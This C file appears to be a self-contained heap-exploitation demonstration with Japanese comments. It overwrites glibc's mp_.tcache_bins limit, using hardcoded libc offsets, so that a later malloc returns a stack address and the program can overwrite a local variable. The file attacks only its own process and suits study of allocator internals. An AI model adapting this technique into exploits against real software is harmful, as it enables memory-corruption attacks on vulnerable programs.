#include <stdio.h>
#include <stdlib.h>

static unsigned long ofs_libc_malloc	= 0x09d260;
static unsigned long ofs_libc_mp 	= 0x1eb280;

// tcacheの改竄
// stackの値を書き換えたい
int main(void){
	unsigned long addr_libc_base;
	void *mp_;	// malloc_per
	size_t *tcache_bins;

	// libc_baseはわかってる前提
	addr_libc_base = (unsigned long)malloc - ofs_libc_malloc;
	mp_ = (void*)(addr_libc_base + ofs_libc_mp);
	tcache_bins = mp_ + 0x50;

	setbuf(stdout, NULL);
	printf("mp_ : %p (tcache_bins = %#lx)\n\n", mp_, *tcache_bins);

	unsigned long *m, *victim;
	unsigned long var = 0xdeadbeef;

	printf("&var   : %p\nvar    = %#lx\n\n", &var, var);

	m = malloc(8);
	*m = (unsigned long)&var;
	free(malloc(0x18));
	// tcach per struct
	// malloc8
	// malloc0x18

	puts("Exploit!");
	// 本来0x410
	// ここでtcachの最大値を書き換え
	*tcache_bins = 0xc0bebeef;	// vuln
	// tcachのdefault最大値以上の値を取得
	victim = malloc(0x438);	// 0x440を確保したい	
	// 0x000055555555b2c0
	// の5555を参照して、チャンクを取れてしまう。
	// 0x00007fffffffe238がbins[64]の値として返してしまって、
	// 書き換えが可能になってしまう。
	*victim = 0xcafebabe;		// overwrite

	printf("victim = %p\nvar    = %#lx\n", victim, var);
}
